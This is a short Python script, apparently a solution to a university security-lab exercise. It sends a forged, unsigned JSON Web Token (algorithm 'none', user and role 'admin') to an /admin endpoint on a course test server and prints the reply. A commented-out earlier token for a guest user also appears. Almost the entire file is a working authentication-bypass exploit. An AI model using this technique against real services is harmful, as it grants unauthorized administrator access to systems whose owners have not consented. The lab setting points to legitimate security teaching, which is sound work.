from base64 import b64encode

import requests,json, base64

# https://www.jwt.io/introduction#how-json-web-tokens-work (Authorization bearer token)
# https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide (alg = none)

HOST = 'http://cns-test.idlab.uantwerpen.be:50009/admin'
PORT = 50009

# info = {"token" : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"}

header = {"alg":"none","typ":"JWT"}

payload = {"user":"admin","role":"admin"}

r = requests.get(HOST,headers={"Authorization" : "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."})


print(f"Status Code: {r.status_code}")
print(r.text)